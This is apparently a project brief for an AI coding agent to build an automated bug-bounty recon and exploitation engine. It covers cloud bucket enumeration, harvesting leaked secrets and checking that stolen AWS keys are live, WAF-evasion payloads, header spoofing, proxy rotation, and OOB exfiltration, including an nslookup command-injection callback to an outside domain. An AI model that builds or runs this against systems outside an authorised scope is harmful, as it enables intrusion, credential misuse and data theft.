Project Manifesto: Elite Recursive Discovery & Automation (Python-Based)

1. Mission Statement

Build a "Recursive Hacking Intelligence" engine. This project focuses on the "Deep-Dive" methodology: bypassing WAFs, discovering hidden cloud assets, and automating the "Vulnerability Chaining" process that leads to high-severity (Critical/High) findings.

2. Advanced Logic & 2025 Techniques

The agent must implement these "Pro-Level" strategies:

A. Advanced Recon & Cloud Surface

Advanced reconnaissance and cloud surface mapping are essential skills for pwn challenges, bug bounties, and web app security testing, building on your focus in vulnerability hunting and AWS security. [blog.intelligencex](https://blog.intelligencex.org/zero-day-hunting-advanced-recon-techniques-2025)

## Core Concepts
Reconnaissance gathers intel on targets without direct interaction (passive) or through probing (active), while cloud surface refers to the external attack surface like exposed buckets, APIs, and misconfigs in AWS, Azure, or GCP. In bug bounties, this uncovers hidden assets for high-payout bugs like open storage or forgotten subdomains. Prioritize passive methods first to avoid detection, aligning with your methodical hunt patterns. [perplexity](https://www.perplexity.ai/search/ebadcf46-9af5-4f45-b489-59d804121ca7)

## Key Techniques
- **Passive Recon:** Use Shodan/Censys for exposed cloud services, Google Dorks for leaks, and DNS monitoring for subdomains; mine JS for endpoints and GitHub for secrets. [blog.intelligencex](https://blog.intelligencex.org/zero-day-hunting-advanced-recon-techniques-2025)
- **Active Recon:** Nmap for port scans, Burp/ZAP for web apps, and cloud-specific like CloudMapper for AWS viz or bucket enumeration on S3/GCP. [armur](https://armur.ai/cloud-native-security/method/method/reconnaissance-and-information-gathering-in-cloud-penetration-testing/)
- **Cloud-Specific:** Hunt misconfigured buckets (S3 via direct HTTP checks, GCP via IAM perms), enumerate via ASN, and map via SSL certs or threat intel. [wiz](https://www.wiz.io/academy/cloud-security/attack-surface-discovery)

## Essential Tools
| Tool | Use Case | Best For Your Focus |
|------|----------|---------------------|
| CloudMapper | AWS resource viz & public exposures | AWS Security Hub extension  [armur](https://armur.ai/cloud-native-security/method/method/reconnaissance-and-information-gathering-in-cloud-penetration-testing/) |
| Shodan/Censys | Internet-wide cloud asset search | Bug bounty surface discovery  [practicalinfosec](https://practicalinfosec.com/ReconnaissanceInPenetratingTesting) |
| Recon-ng/Maltego | OSINT & relationship mapping | Pwn machine prep  [practicalinfosec](https://practicalinfosec.com/ReconnaissanceInPenetratingTesting) |
| Nuclei/Amass | Automated vuln/subdomain enum | Web app bug hunts  [blog.intelligencex](https://blog.intelligencex.org/zero-day-hunting-advanced-recon-techniques-2025) |
| Wiz/Rapid7 | Continuous cloud ASM | Enterprise surface mgmt  [wiz](https://www.wiz.io/academy/cloud-security/attack-surface-discovery) |

Start with one target daily, document anomalies, and chain to exploits like your past IDOR/JWT work. Practice on HTB or public scopes to refine. [perplexity](https://www.perplexity.ai/search/26a5c300-1a21-425b-9077-8e35b9b256f8)
Cloud Enumeration: Don't just scan IPs. Scan for misconfigured S3 buckets, Azure Blobs, and Google Cloud Storage using permutations of the target name.

GitHub/GitLab Dorking: Automatically search public repositories for the target's domain to find leaked API keys, environment files (.env), or internal documentation.

Permutation Scanning: Found subdomains based on patterns (e.g., if dev.target.com exists, check dev-api.target.com, dev-staging.target.com).

B. Intelligent JS & API Mining

Intelligent JavaScript and API mining uncovers hidden endpoints, parameters, and secrets in web apps, boosting your bug bounty success on platforms like HackerOne or Bugcrowd. This builds directly on your web app focus and recon habits from past hunts like IDOR/JWT testing. [perplexity](https://www.perplexity.ai/search/ebadcf46-9af5-4f45-b489-59d804121ca7)

## Key Techniques
Mine JS files for endpoints by parsing strings, regex for URLs/params, and chaining with fuzzing tools like ffuf. Use AI to analyze extracted strings for features/secrets or GraphQL introspection for hidden mutations. [reddit](https://www.reddit.com/r/bugbounty/comments/1mdzsi9/analyzing_js_files_with_ai/)
Automate API discovery via Burp extensions that scan proxied JS traffic, revealing params missed by basic crawlers. [yeswehack](https://www.yeswehack.com/learn-bug-bounty/discover-map-hidden-endpoints-parameters)
Prioritize live targets: Download JS from subdomains, grep for anomalies, then test business logic flaws. [perplexity](https://www.perplexity.ai/search/80aa4f2e-d1ae-43fe-b30f-df749cdd85eb)

## Top Tools
| Tool | Purpose | Usage Tip |
|------|---------|-----------|
| LinkFinder | Extracts endpoints/params from JS files | `python linkfinder.py -i https://target.js -o cli` – chain with JSFScan.sh for wordlists. [github](https://github.com/GerbenJavado/LinkFinder) |
| JSFScan.sh | Automates JS recon, var extraction, DOM XSS scan | `./JSFScan.sh -u target.com --all` – outputs reports for manual review. [github](https://github.com/KathanP19/JSFScan.sh) |
| JShunter | Finds API endpoints/secrets in JS | GitHub tool for vuln spotting; integrate with Nuclei. [github](https://github.com/cc1a2b/JShunter) |
| Param Miner / JSpector (Burp) | Hidden param fuzzing from JS | Proxy traffic, auto-detects during hunts. [infosecwriteups](https://infosecwriteups.com/bug-bounty-tools-a-practical-list-of-old-new-tools-real-hackers-use-bbf7eb7009f8) |

## Workflow Steps
- **Recon Phase**: Subfinder/Amass for JS-heavy subdomains, then wget/curl all .js files. [perplexity](https://www.perplexity.ai/search/80aa4f2e-d1ae-43fe-b30f-df749cdd85eb)
- **Mining**: Run LinkFinder/JSFScan on files; AI prompt extracted strings (e.g., Ollama: "List APIs/secrets"). [osintteam](https://osintteam.blog/part-2-advanced-js-extraction-analysis-automation-for-bug-bounty-recon-5535e5e04463)
- **Test**: Fuzz discovered endpoints for IDOR/auth bypass; report chains like your prior JWT work. [linkedin](https://www.linkedin.com/pulse/api-bug-bounty-101-modern-techniques-find-your-first-2025-medeiros-frwac)
Practice on HTB web boxes or VDP scopes before paid programs – expect 1-2 weeks per target for breakthroughs. [perplexity](https://www.perplexity.ai/search/26a5c300-1a21-425b-9077-8e35b9b256f8)

Recursive JS Analysis: Download JS files -> Find new endpoints -> Crawl those endpoints -> Find more JS files.

Secret Extraction 2.0: Use high-confidence regex to find Firebase URLs, AWS keys, and Bearer tokens, but add a "Validation" step (e.g., check if the AWS key is active).

GraphQL Introspection: Automatically detect GraphQL endpoints and attempt to map the entire schema to find "Hidden" queries.

Data mining: Found and extract some data from the target website. That can be reused for other tests. Or explore more about the target.

C. Vulnerability Chaining & OOB (Out-of-Band)
Vulnerability chaining and OOB techniques elevate low-severity bugs into high-impact finds, ideal for your bug bounty web app focus and prior recon/JS mining hunts. [perplexity](https://www.perplexity.ai/search/996051be-eb61-469a-a82c-ed93957b56d8)

## Vulnerability Chaining
Chaining links multiple low-level issues—like SSRF to XSS or IDOR to logic flaws—for escalated impact, often boosting bounties from low to critical.  For example, chain SSRF (via file download paths) to XSS by redirecting to your hosted payload, proving execution without full RCE.  In bug bounties, document the full chain clearly, as in API data leaks leading to auth bypass and abuse. [perplexity](https://www.perplexity.ai/search/ebadcf46-9af5-4f45-b489-59d804121ca7)

## OOB Techniques
OOB shines in blind vulns (e.g., command injection, XXE, SQLi) where no direct response shows output; it forces outbound DNS/HTTP/ICMP to your server for data exfil.  DNS is most reliable due to common egress allowances—set up tcpdump on your VPS to capture queries like `nslookup $(hostname).oob.yourdomain.com` from Windows cmd injection.  For XXE, use payloads triggering HTTP callbacks to exfil files like /etc/passwd. [notsosecure](https://notsosecure.com/out-band-exploitation-oob-cheatsheet)

## Bug Bounty Tips
Practice on HTB web boxes or VDPs, chaining your past IDOR/JWT finds with OOB for proof.  Tools: Burp Collaborator for quick OOB tests, ffuf for chaining fuzzing post-recon.  Target low-comp scopes, report chains with PoC videos for max payouts. [perplexity](https://www.perplexity.ai/search/80aa4f2e-d1ae-43fe-b30f-df749cdd85eb)

OOB Integration: All tests for SSRF, Blind SQLi, and Blind XSS must integrate with an Out-of-Band listener (like interact.sh).

The "Chain" Logic: If a "Hidden Directory" is found via brute-force, immediately trigger a "Deep Crawl" and "Nuclei Scan" specifically on that directory.

D. WAF Evasion & Efficiency

WAF evasion boosts your bug bounty success on web apps by letting payloads reach vulnerabilities like XSS or SQLi despite filters. Efficiency means quick fingerprinting, targeted bypasses, and chaining with your recon/JS mining workflow to avoid blocks. [perplexity](https://www.perplexity.ai/search/b3e4bd8d-5904-48c4-a1d4-8af3c7c640e0)

## Fingerprint WAF First
Identify the WAF type (e.g., Cloudflare, ModSecurity) before testing bypasses—tools like WAFW00F send probes to detect it fast. WhatWaf or Nmap's http-waf-detect script work well in Burp or terminal for bug hunts. This step saves time, as bypasses vary by vendor. [youtube](https://www.youtube.com/watch?v=fZIERC4elzc)

## Core Evasion Techniques
Use case variation (e.g., `<ScRiPt>`), encoding (URL, Base64, Unicode), or comments (`<script/*foo*/>alert(1)</script>`) to slip past signature rules. Header tricks like spoofing X-Forwarded-For to internal IPs or random User-Agents evade IP-based blocks; add dynamic delays via Burp extensions. For payloads, mutate non-malicious parts like multipart boundaries or XML namespaces to exploit parsing diffs between WAF and app frameworks. [mdsec.co](https://www.mdsec.co.uk/2024/10/when-wafs-go-awry-common-detection-evasion-techniques-for-web-application-firewalls/)

## Efficiency Tips
Fuzz payloads systematically with Burp Intruder or sqlmap's --tamper scripts, rotating IPs/User-Agents to dodge rate limits—aim for 100-500 requests max per session. Prioritize business logic flaws (IDOR chains from your JS mining) over direct injections, as they often bypass WAFs entirely. Practice on HTB web boxes or VDPs, logging blocks to refine for live bounties like HackerOne. [perplexity](https://www.perplexity.ai/search/ebadcf46-9af5-4f45-b489-59d804121ca7)

| Technique | Tool/Example | When to Use |
|-----------|--------------|-------------|
| Encoding/Obfuscation | Base64 `<script>`, sqlmap --tamper | SQLi/XSS signatures  [dev](https://dev.to/godofgeeks/bypassing-web-application-firewalls-174c) |
| Header Spoofing | X-Forwarded-For: 127.0.0.1 | Geo/IP blocks  [mdsec.co](https://www.mdsec.co.uk/2024/10/when-wafs-go-awry-common-detection-evasion-techniques-for-web-application-firewalls/) |
| Parsing Exploits | Multipart boundary fuzz | Cloudflare/AWS WAFs  [arxiv](https://arxiv.org/html/2503.10846v3) |
| Rate Evasion | Burp IP Rotate + delays | Heavy fuzzing  [mdsec.co](https://www.mdsec.co.uk/2024/10/when-wafs-go-awry-common-detection-evasion-techniques-for-web-application-firewalls/)

Smart Rate-Limiting: Implement adaptive delays. If the tool detects a 403 or 429 status code, it must automatically slow down or rotate proxies.

Header Randomization: Every request must use randomized User-Agents and "Origin-spoofing" headers (X-Forwarded-For, X-Real-IP).

Deduplication: Do not scan the same "Template" twice. If /product/1 and /product/99 have the same HTML structure, only scan one to save time/resources.

3. Technical Stack Requirements

Orchestrator: Python 3.10+ (Asyncio/Aiohttp).

Storage: File output for update founding, make the output easy to read, short and forcus on main point.

Core Binaries: subfinder, httpx, katana, nuclei, trufflehog (for secrets), ffuf (for fuzzing).

4. Operational Protocols

Low Noise, High Impact: Focus on "Critical" severity bugs (SSRF, IDOR, RCE).

Contextual Analysis: If httpx detects "PHP," run PHP-specific wordlists. If it detects "Java," focus on SpringBoot/Log4j templates.

Data Logging: Every finding must be logged with a "Reproducibility" snippet (Curl command).

5. Immediate Next Step for Agent

"Initialize the project. Create a core/ directory and write a smart_recon.py script. This script should:

Run subdomain discovery.

Use httpx to find live hosts and their technologies.

New Logic: For every host found, check if it's hosted on AWS/Azure/GCP and run a permutation check for related Cloud Buckets.

Store all results in a SQLite database named hunter.db."